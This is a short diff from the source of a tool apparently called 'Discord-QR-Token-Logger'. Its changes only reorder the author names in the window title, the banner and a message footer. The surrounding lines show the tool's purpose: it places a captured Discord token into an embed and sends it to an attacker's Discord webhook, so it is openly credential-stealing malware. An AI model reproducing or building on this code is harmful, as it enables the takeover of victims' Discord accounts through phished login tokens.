@@ -120,16 +120,16 @@ def main(webhook_url) -> None:
         else:
             embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
         webhook.add_embed(embed)
-        embed.set_footer(text='By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0', inline=False)
+        embed.set_footer(text='By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0', inline=False)
         Write.Print("\n[!] Sending data to discord webhook...", Colors.red_to_purple)
         webhook.execute()
     Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)
     
 if __name__ == "__main__":
-    System.Title('QR DISCORD LOGIN - By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0')
+    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0')
     System.Size(140, 35)
     print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(banner), 1))
-    print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0")), 1))
+    print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0")), 1))
     print(Colorate.Horizontal(Colors.rainbow, Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
     def pystray_icon():
         def window_state(icon, item):
